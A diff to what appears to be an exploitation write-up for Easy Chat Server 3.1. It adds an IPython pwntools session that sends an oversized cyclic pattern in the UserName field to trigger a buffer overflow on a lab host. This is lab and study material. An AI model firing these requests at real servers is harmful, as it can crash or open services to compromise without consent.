@@ -35,6 +35,33 @@ In [8]: r.writeline(req)
 ![Image 1](img/efs-easy-chat-server-3.1-1.png)
 
 ```py
+In [6]: req =  b'POST /registresult.htm HTTP/1.1\r\n'
+   ...: req += b'Host: 192.168.122.186\r\n'
+   ...: req += b'User-Agent: curl/7.58.0\r\n'
+   ...: req += b'Accept: */*\r\n'
+   ...: req += b'Connection: close\r\n'
+   ...: req += b'Content-Type: application/x-www-form-urlencoded\r\n'
+   ...: req += b'Referer: http://192.168.1.11/register.ghp\r\n'
+   ...: 
+   ...: req += b'UserName=' + cyclic(1000)
+   ...: req += b'&Password=test'
+   ...: req += b'&Password1=test'
+   ...: req += b'&Sex=1&Email=x@'
+   ...: req += b'&Icon=x.gif'
+   ...: req += b'&Resume=xxxx'
+   ...: req += b'&cw=1'
+   ...: req += b'&RoomID=4'
+   ...: req += b'&RepUserName=admin'
+   ...: req += b'&submit1=Register'
+   ...: 
+
+In [7]: r = remote('192.168.122.186', 80)
+   ...: 
+[x] Opening connection to 192.168.122.186 on port 80
+[x] Opening connection to 192.168.122.186 on port 80: Trying 192.168.122.186
+[+] Opening connection to 192.168.122.186 on port 80: Done
+
+In [8]: r.writeline(req)
 ```
 
 ![Image 2](img/efs-easy-chat-server-3.1-2.png)
